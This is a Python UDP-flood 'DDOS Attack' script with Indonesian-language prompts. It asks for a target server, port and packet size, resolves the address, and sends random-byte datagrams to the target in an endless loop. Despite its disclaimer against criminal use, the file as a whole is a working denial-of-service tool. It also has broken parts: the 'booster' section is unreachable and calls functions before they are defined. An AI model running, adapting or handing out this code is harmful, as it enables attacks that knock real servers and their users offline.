
"""Script yang kami buat bersifat OPEN SOURCE"""

import os, sys, time, socket, string, random

os.system(' ')

print ("\n [*] Memulai Program....\n")
time.sleep(3)
print (" [..............................] 0%")
time.sleep(3)
print (" [>>>>>>>>>>>>..................] 40%")
time.sleep(2)
print (" [>>>>>>>>>>>>>>>>>>>...........] 62%")
time.sleep(3)
print (" [>>>>>>>>>>>>>>>>>>>>>>>>>>>>..] 94%")
time.sleep(2)
print (" [>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>] 100%\n")
time.sleep (3)
print (" [*] Membuka Program....\n")
time.sleep(3)

print ("#----------------------------------------------------------------#")
print ("<|-----------------------| DDOS Attack |------------------------|>")
print (" | Author:             RX77E, Security Syber Team Indonean      |")
print (" | Spesial Thank's:    RX77E                                    |")
print (" | Github:             https://github.com/Sreetx                |")
print (" | Instagram:          https://www.instagram.com/memelucubikin  |")
print (" |--------------------------------------------------------------|")
print (" |    Jangan gunakan script ini untuk tindak kejahatan. Kami    |")
print (" |    tidak bertanggung jawab atas apapun yang anda lakukan.    |")
print ("<|--------------------------------------------------------------|>")
print ("#----------------------------------------------------------------#")

enter = input ("\n [#] Tekan enter untuk melanjutkan...\n")
baca = open("komponen/Tentang - default.txt", "r")
print(baca.read())

try:    
    host = input("\n[?] Masukan Alamat Server: ")
    port = input("[?] Masukan Port: ")
    paket = input("[?] Berapa ukuran paket yang ingin anda kirimkan(MB): ")
    ip = socket.gethostbyname(host)
    tanya2 = input("[?] Gunakan booster? Booster membuat penyerangan 20% lebih besar [Y/n]: ")
    print ("[*] Mendapatkan IP: [" + ip +"]")
    time.sleep(3)
    print ("[*] [Ip Terkunci]" )
    time.sleep(3)
    print ("[*] Memulai Menyerang [" + host + "]....")
    time.sleep(3)
except socket.gaierror: print (" [!] Gagal mendapatkan IP...\n");sys.exit()
except KeyboardInterrupt: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()

def ddos():
    try:
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 + int(paket))
        sent = 50000 + int(paket)
        ddos.connect((ip, int(port)))
        ddos.sendto(bytes, (ip, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
    except socket.error: print ("""\n[!] Socket error...
 [#] Restart script ini atau sumber internet anda
 [#] Mungkin paket yang anda masukan terlalu besar
 [#] Max paket: 15500MB. Paket yang anda masukkan """+ paket +"""MB\n""");sys.exit()
    except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
    except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()
    except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
    except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()

while True:
    try:
        ddos()
    except KeyboardInterrupt: pass;sys.exit()

if tanya2.lower() == 'y':
    while True:
        try:
            booster()
            booster2()
            booster3()
            booster4()
            booster5()
        except KeyboardInterrupt: pass;sys.exit()

    def booster():
        try:
            ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(50000 + int(paket))
            sent = 50000 + int(paket)
            ddos.connect((ip, int(port)))
            ddos.sendto(bytes, (ip, int(port)))
            sent = sent + 1
            print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
        except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
        except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()
    
    def booster2():
        try:
            ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(50000 + int(paket))
            sent = 50000 + int(paket)
            ddos.connect((ip, int(port)))
            ddos.sendto(bytes, (ip, int(port)))
            sent = sent + 1
            print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
        except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
        except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()
    
    def booster3():
        try:
            ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(50000 + int(paket))
            sent = 50000 + int(paket)
            ddos.connect((ip, int(port)))
            ddos.sendto(bytes, (ip, int(port)))
            sent = sent + 1
            print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
        except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
        except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()
    
    def booster4():
        try:
            ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(50000 + int(paket))
            sent = 50000 + int(paket)
            ddos.connect((ip, int(port)))
            ddos.sendto(bytes, (ip, int(port)))
            sent = sent + 1
            print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
        except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
        except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()
    
    def booster5():
        try:
            ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(50000 + int(paket))
            sent = 50000 + int(paket)
            ddos.connect((ip, int(port)))
            ddos.sendto(bytes, (ip, int(port)))
            sent = sent + 1
            print (" [*] Menyerang "+ ip +" Di Port "+ port +" Dengan Ukuran "+ paket +"MB")
        except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
        except KeyboardInterrupt: print ("\n  [*] Menghentikan Penyerangan....");time.sleep(1);print ("  [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
        except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()

elif tanya2.lower() == 'n':
    pass
else:
    pass